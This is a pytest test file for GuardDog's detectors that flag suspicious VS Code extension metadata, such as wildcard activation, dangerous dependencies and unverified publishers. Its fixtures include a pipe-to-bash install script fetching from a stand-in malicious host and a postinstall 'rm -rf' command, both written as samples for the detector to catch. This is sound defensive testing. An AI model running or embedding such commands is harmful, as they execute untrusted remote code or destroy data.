import pytest

from guarddog.analyzer.metadata.extension.empty_information import ExtensionEmptyInfoDetector
from guarddog.analyzer.metadata.extension.suspicious_permissions import ExtensionSuspiciousPermissionsDetector
from guarddog.analyzer.metadata.extension.suspicious_publisher import ExtensionSuspiciousPublisherDetector


class TestExtensionEmptyInfoDetector:
    detector = ExtensionEmptyInfoDetector()
    
    def test_no_package_info(self):
        matches, message = self.detector.detect(None)
        assert matches
        assert "no package information" in message
    
    def test_empty_manifest(self):
        package_info = {
            "manifest": {
                "name": "test-extension",
                "description": "",
                "displayName": ""
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert "Extension Marketplace (manifest)" in message
    
    def test_non_empty_manifest_local(self):
        package_info = {
            "manifest": {
                "name": "test-extension",
                "description": "A useful extension",
                "displayName": "Test Extension"
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches


class TestExtensionSuspiciousPermissionsDetector:
    detector = ExtensionSuspiciousPermissionsDetector()
    
    def test_no_package_info(self):
        matches, message = self.detector.detect(None)
        assert not matches
        assert message is None
    
    def test_wildcard_activation_event(self):
        package_info = {
            "manifest": {
                "activationEvents": ["*"]
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "suspicious activation events" in message
        assert "*" in message
    
    def test_suspicious_filesystem_activation(self):
        package_info = {
            "manifest": {
                "activationEvents": ["onFileSystem:*"]
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "suspicious activation events" in message
        assert "onFileSystem:*" in message
    
    def test_safe_activation_events(self):
        package_info = {
            "manifest": {
                "activationEvents": ["onCommand:myextension.hello", "onLanguage:python"]
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches
    
    def test_suspicious_script_rm_rf(self):
        package_info = {
            "manifest": {
                "scripts": {
                    "postinstall": "rm -rf /tmp/something"
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "suspicious script" in message
        assert "rm -rf" in message
    
    def test_suspicious_script_curl(self):
        package_info = {
            "manifest": {
                "scripts": {
                    "install": "curl http://malicious.com/script.sh | bash"
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "suspicious script" in message
        assert "curl" in message
    
    def test_safe_scripts(self):
        package_info = {
            "manifest": {
                "scripts": {
                    "compile": "tsc",
                    "test": "mocha"
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches
    
    def test_suspicious_dependencies(self):
        package_info = {
            "manifest": {
                "dependencies": {
                    "child_process": "^1.0.0",
                    "lodash": "^4.0.0"
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "dangerous dependencies" in message
        assert "child_process" in message
    
    def test_safe_dependencies(self):
        package_info = {
            "manifest": {
                "dependencies": {
                    "lodash": "^4.0.0",
                    "axios": "^0.21.0"
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches
    
    def test_unverified_publisher_low_downloads(self):
        package_info = {
            "manifest": {},
            "marketplace": {
                "download_count": 500,
                "publisher": {
                    "flags": []
                },
                "publisher_isDomainVerified": False
            },
            "source": "remote"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "unverified publisher" in message
        assert "low download count" in message
    
    def test_verified_publisher_high_downloads(self):
        package_info = {
            "manifest": {},
            "marketplace": {
                "download_count": 100000,
                "publisher": {
                    "flags": ["verified"]
                },
                "publisher_isDomainVerified": True
            },
            "source": "remote"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches
    
    def test_terminal_contribution(self):
        package_info = {
            "manifest": {
                "contributes": {
                    "terminal": {
                        "profiles": ["custom-terminal"]
                    }
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "terminal functionality" in message
    
    def test_task_definitions_contribution(self):
        package_info = {
            "manifest": {
                "contributes": {
                    "taskDefinitions": [
                        {
                            "type": "custom-task"
                        }
                    ]
                }
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "task definitions" in message


    def test_suspicious_sole_category(self):
        package_info = {
            "manifest": {
                "categories": ["Debuggers"]
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert matches
        assert message is not None
        assert "suspicious sole category" in message
        assert "debuggers" in message
    
    def test_multiple_categories_with_suspicious(self):
        package_info = {
            "manifest": {
                "categories": ["Debuggers", "Machine Learning", "Testing"]
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches  # Should not flag because multiple categories

class TestExtensionSuspiciousPublisherDetector:
    detector = ExtensionSuspiciousPublisherDetector()
    
    def test_no_package_info(self):
        matches, message = self.detector.detect(None)
        assert not matches
        assert message is None
    
    def test_empty_publisher(self):
        package_info = {
            "manifest": {
                "publisher": ""
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches  # Handled by empty-information detector
    
    def test_valid_publisher_local(self):
        package_info = {
            "manifest": {
                "publisher": "microsoft"
            },
            "marketplace": {},
            "source": "local"
        }
        matches, message = self.detector.detect(package_info)
        assert not matches
